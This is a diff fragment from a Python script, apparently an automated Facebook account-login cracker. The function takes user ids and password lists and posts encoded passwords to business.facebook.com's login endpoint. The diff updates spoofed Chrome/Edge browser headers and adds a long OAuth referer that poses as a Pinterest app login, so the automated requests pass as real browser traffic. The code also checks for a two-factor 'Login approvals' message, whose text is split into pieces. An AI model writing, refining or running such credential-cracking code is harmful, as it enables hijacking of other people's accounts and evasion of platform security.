@@ -1546,22 +1546,28 @@ def mobile(uid,pwx,tl):
             'ab_test_data': 'fAfAA/ff//AAAAAAAAAAAAAAfAAAAAAAAAAAAAAAAAAVVVq/VVGAAA',
             'encpass':  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers = {
+            'authority': 'business.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
             'origin': 'https://business.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',
-            'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
+            'referer': 'https://business.facebook.com/login/device-based/login/async/?api_key=274266067164&auth_token=cd0667d10038f707a6a634de7870eef7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727799868676%26e2e%3D%257B%2522init%2522%253A1727799868676%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3Def106713-7b2d-4e64-99e3-9472dc33e4a9%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DtdE1uLjyHZfqDyLNeUM50AfQug3nBXEVrhSQsAz-b4Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfac9e37c-09c8-4088-966c-de4a4cfdc693%26tp%3Dunspecified&refsrc=deprecated&app_id=274266067164&cancel=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D&lwv=100',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="122.0.6261.129", "Not(A:Brand";v="24.0.0.0", "Microsoft Edge";v="122.0.2365.92"',
             'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+            'viewport-width': '511'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
